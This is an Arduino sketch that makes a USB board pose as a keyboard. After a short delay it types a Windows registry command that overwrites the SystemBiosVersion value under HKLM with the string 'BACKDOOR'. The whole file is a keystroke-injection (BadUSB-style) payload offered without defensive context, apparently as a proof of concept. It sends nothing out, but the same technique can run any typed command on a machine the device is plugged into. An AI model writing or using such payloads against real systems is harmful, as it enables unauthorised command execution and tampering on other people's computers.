#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  Keyboard.println(F("reg add HKLM\\HARDWARE\\DESCRIPTION\\System /v SystemBiosVersion /t REG_SZ /d \"BACKDOOR\" /f"));
}
